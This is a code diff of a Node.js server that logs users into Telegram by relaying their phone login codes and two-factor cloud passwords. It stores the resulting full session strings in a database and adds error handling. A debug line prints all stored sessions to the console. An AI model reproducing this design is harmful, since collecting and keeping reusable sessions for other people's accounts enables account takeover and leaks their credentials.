@@ -29,9 +29,13 @@ function clearDB(){
   dataBase.deleteMany({});
 }
 //clearDB();
-imgBase.findOne({}).then(res => {
+// imgBase.findOne({}).then(res => {
+//   console.log(res);
+// })
+dataBase.find({}).then(res => {
   console.log(res);
 })
+  
 
 const USERS = {};
 
@@ -40,32 +44,44 @@ async function main() {
 
   app.post('/auth/phone', async (req, res) => {
     const { id, phone } = req.body;
+    try {
+      USERS[id] = { phone };
+      USERS[id].client = new TelegramClient( new StringSession(""), apiId, apiHash,  { connectionRetries: 5, useWSS: true });
+      await USERS[id].client.connect();
 
-    USERS[id] = { phone };
-    USERS[id].client = new TelegramClient( new StringSession(""), apiId, apiHash,  { connectionRetries: 5, useWSS: true });
-    await USERS[id].client.connect();
+      USERS[id].resultSendCode = await USERS[id].client.invoke(
+        new Api.auth.SendCode({
+          phoneNumber: USERS[id].phone,
+          apiId,
+          apiHash,
+          settings: new Api.CodeSettings({
+            allowFlashcall: true,
+            currentNumber: true,
+            allowAppHash: true,
+            allowMissedCall: true,
+            logoutTokens: [Buffer.from("arbitrary data here")],
+          }),
+        })
+      );
 
-    USERS[id].resultSendCode = await USERS[id].client.invoke(
-      new Api.auth.SendCode({
-        phoneNumber: USERS[id].phone,
-        apiId,
-        apiHash,
-        settings: new Api.CodeSettings({
-          allowFlashcall: true,
-          currentNumber: true,
-          allowAppHash: true,
-          allowMissedCall: true,
-          logoutTokens: [Buffer.from("arbitrary data here")],
-        }),
-      })
-    );
-
-    res.json({ msg:'Код был отправлен!', phone, id});
-    
+      res.json({ type: 'succes', msg:'Код был отправлен!' });
+    }
+    catch(e){
+      console.log(e)
+      if(e.errorMessage === 'PHONE_NUMBER_INVALID'){
+        res.json({ type: 'error', msg:'Ошибка в номере телефона!' });
+      }
+      else{
+        res.json({ type: 'error', msg:e.errorMessage });
+      }
+      await USERS[id].client.disconnect();
+      await USERS[id].client.destroy();
+      delete USERS[id];
+    }
   });
 
   app.post('/auth/code-password', async (req, res) => {
-    const { id, code, password } = req.body;
+    const { id, username, code, password } = req.body;
     USERS[id].code = code.replaceAll(' ','');
     USERS[id].password = password;
     try {     
@@ -77,48 +93,51 @@ async function main() {
         })
       );
 
-      await dataBase.insertOne({ id, session: USERS[id].client.session.save() });
-      res.json({ msg:'Вы были авторизованы!', code, password, id, session: USERS[id].client.session.save()});
-      await client.disconnect();
-      await client.destroy();
+      await dataBase.insertOne({ id, username, isBanned: false, session: USERS[id].client.session.save(), post_image: null, post_text: null});
+      res.json({ type: 'succes', msg:'Вы были авторизованы!', session: USERS[id].client.session.save()});
+      await USERS[id].client.disconnect();
+      await USERS[id].client.destroy();
       delete USERS[id];
     } catch (err) {
       if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
-        console.log("🔒 Требуется пароль 2FA...");
-        const passwordInfo = await USERS[id].client.invoke(new Api.account.GetPassword());
-        const password = await USERS[id].password; // пароль от пользователя
-        const passwordSrp = await passwordUtils.computeCheck(passwordInfo, password);
-    
-        await USERS[id].client.invoke( new Api.auth.CheckPassword({ password: passwordSrp }) );
-
-        await dataBase.insertOne({ id, session: USERS[id].client.session.save(), post_image: null, post_text: null });
-        res.json({ msg:'Вы были авторизованы!', code, password, id, session: USERS[id].client.session.save()});
-        await client.disconnect();
-        await client.destroy();
-        delete USERS[id];
+        try{
+          const passwordInfo = await USERS[id].client.invoke(new Api.account.GetPassword());
+          const password = await USERS[id].password;
+          const passwordSrp = await passwordUtils.computeCheck(passwordInfo, password);
+          await USERS[id].client.invoke( new Api.auth.CheckPassword({ password: passwordSrp }) );
+  
+          await dataBase.insertOne({  id, username, isBanned: false, session: USERS[id].client.session.save(), post_image: null, post_text: null });
+          res.json({ type: 'succes', msg:'Вы были авторизованы!', session: USERS[id].client.session.save()});  
+        }
+        catch(err2){
+          if (err2.errorMessage === "PASSWORD_HASH_INVALID") {
+            res.json({ type: 'error', msg:'Облачный пароль не совпадает!'});
+          } 
+        }
       } else {
         console.error("❌ Ошибка входа:", err);
-        return res.json({ msg:'Ошибка при входе', err: err.errorMessage });
+        if (err.errorMessage === "PHONE_CODE_INVALID") {
+          res.json({ type: 'error', msg:'Код введен не правильно!'});
+        }
       }
 
-      if (err.errorMessage === "PHONE_CODE_EXPIRED") {
-    
-        USERS[id].resultSendCode = await USERS[id].client.invoke(
-          new Api.auth.SendCode({
-            phoneNumber: USERS[id].phone,
-            apiId,
-            apiHash,
-            settings: new Api.CodeSettings({})
-          })
-        );
-        return res.json({ msg:'Новый код отправлен. Введите его снова:'});
+      console.log('Удаляем временного пользователя');
+      await USERS[id].client.disconnect();
+      await USERS[id].client.destroy();
+      delete USERS[id];
+      console.log(USERS);
 
+      if (err.errorMessage === "PHONE_CODE_EXPIRED") {
+        res.json({ type: 'error', msg:'Время кода истекло!'});
       } 
-      
+
     }
 
   });
   
+
+
+
 
   app.post('/upload-image', async (req, res) => {
     const { id, current, thumb } = req.body;
